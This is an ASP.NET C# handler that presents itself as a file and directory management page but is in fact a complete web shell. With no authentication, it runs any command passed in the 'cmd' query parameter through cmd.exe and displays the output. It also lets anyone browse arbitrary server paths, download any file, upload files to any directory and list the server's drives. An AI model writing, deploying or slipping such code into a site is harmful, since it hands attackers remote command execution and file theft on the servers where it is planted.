<%@ WebHandler Language="C#" Class="FileExplorerHandler" %>
using System;
using System.Web;
using System.IO;
using System.Text;
using System.Diagnostics;

public class FileExplorerHandler : IHttpHandler
{
    public bool IsReusable
    {
        get { return true; }
    }

    public void ProcessRequest(HttpContext context)
    {
        string directoryPath = context.Request.QueryString["directory"];
        if (string.IsNullOrEmpty(directoryPath))
            directoryPath = context.Server.MapPath("~/");

        string downloadFilePath = context.Request.QueryString["download"];
        if (!string.IsNullOrEmpty(downloadFilePath))
        {
            DownloadFile(context, downloadFilePath);
            return;
        }

        string command = context.Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(command))
        {
            ExecuteCommand(context, command);
        }

        if (context.Request.Files.Count > 0)
        {
            UploadFiles(context, directoryPath);
        }

        ShowFilesAndDirectories(context, directoryPath);
    }

    private void ShowFilesAndDirectories(HttpContext context, string directoryPath)
    {
        StringBuilder response = new StringBuilder();
        response.Append("<html>\n<head>\n<title>File and Directory Management</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n");

        // Output the current path
        response.Append("<h2>List of Files and Directories</h2>");
        response.Append("<ul>");
        try
        {
            DirectoryInfo dirInfo = new DirectoryInfo(directoryPath);

            if (dirInfo.Parent != null)
            {
                response.Append("<li>");
                response.Append("<a href=\"?directory=" + context.Server.UrlEncode(dirInfo.Parent.FullName) + "\">..</a>");
                response.Append("</li>");
            }

            foreach (DirectoryInfo dir in dirInfo.GetDirectories())
            {
                response.Append("<li>");
                response.Append("<a href=\"?directory=" + context.Server.UrlEncode(dir.FullName) + "\">[DIR] " + dir.Name + "</a>");
                response.Append("</li>");
            }

            foreach (FileInfo file in dirInfo.GetFiles())
            {
                response.Append("<li>");
                response.Append("<a href=\"" + context.Request.RawUrl + "&download=" + context.Server.UrlEncode(file.FullName) + "\">[FILE] " + file.Name + "</a>");
                response.Append("&nbsp;&nbsp;&nbsp; Size: " + file.Length + " bytes");
                response.Append("&nbsp;&nbsp;&nbsp; Last Modified: " + file.LastWriteTime);
                response.Append("</li>");
            }
        }
        catch (Exception ex)
        {
            response.Append("<li>");
            response.Append("Error: " + ex.Message);
            response.Append("</li>");
        }
        response.Append("</ul>");

        // Command execution form
        response.Append("<h2>Command Execution</h2>");
        response.Append("<form method=\"GET\">");
        response.Append("Command: <input name=\"cmd\" size=\"50\" value=\"\"><input type=\"submit\" value=\"Run\">");
        response.Append("</form>");

        // Upload form
        response.Append("<h2>Upload File</h2>");
        response.Append("<form method=\"POST\" enctype=\"multipart/form-data\">");
        response.Append("<input type=\"file\" name=\"file\" />");
        response.Append("<input type=\"submit\" value=\"Upload\" />");
        response.Append("</form>");

        // Output the available drives
        response.Append("<h2>List of Drives</h2>");
        string[] drives = Directory.GetLogicalDrives();
        response.Append("<ul>");
        foreach (string drive in drives)
        {
            response.Append("<li>");
            response.Append(drive);
            response.Append("</li>");
        }
        response.Append("</ul>");

        response.Append("</body>\n</html>");
        context.Response.Write(response.ToString());
    }

    private void DownloadFile(HttpContext context, string filePath)
    {
        try
        {
            if (!File.Exists(filePath))
            {
                context.Response.Write("File not found or invalid file path.");
                return;
            }

            string fileName = Path.GetFileName(filePath);
            context.Response.Clear();
            context.Response.ClearHeaders();
            context.Response.ContentType = "application/octet-stream";
            context.Response.AddHeader("Content-Disposition", "attachment; filename=" + fileName);

            using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            {
                long fileLength = fileStream.Length;
                int bufferSize = 1024 * 1024; // 1 MB buffer, you can adjust this based on your needs
                byte[] buffer = new byte[bufferSize];
                int bytesRead;

                while ((bytesRead = fileStream.Read(buffer, 0, bufferSize)) > 0)
                {
                    context.Response.OutputStream.Write(buffer, 0, bytesRead);
                    context.Response.Flush();
                }
            }

            context.Response.End();
        }
        catch (Exception ex)
        {
            context.Response.Write("Error downloading the file: " + ex.Message);
            context.Response.End();
        }
    }

    private void ExecuteCommand(HttpContext context, string command)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + command;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true; // Run the command without creating a new window
            Process p = Process.Start(psi);
            StreamReader stmrdr = p.StandardOutput;
            string output = stmrdr.ReadToEnd();
            stmrdr.Close();

            context.Response.Write("<h2>Command Output</h2>");
            context.Response.Write("<pre>");
            context.Response.Write(System.Web.HttpUtility.HtmlEncode(output));
            context.Response.Write("</pre>");
        }
        catch (Exception ex)
        {
            context.Response.Write("Error executing the command: " + ex.Message);
        }
    }

    private void UploadFiles(HttpContext context, string directoryPath)
    {
        try
        {
            HttpFileCollection files = context.Request.Files;

            for (int i = 0; i < files.Count; i++)
            {
                HttpPostedFile file = files[i];
                if (file.ContentLength > 0)
                {
                    string fileName = Path.GetFileName(file.FileName);
                    string filePath = Path.Combine(directoryPath, fileName);
                    file.SaveAs(filePath);
                }
            }
        }
        catch (Exception ex)
        {
            context.Response.Write("Error uploading the file: " + ex.Message);
        }
    }
}
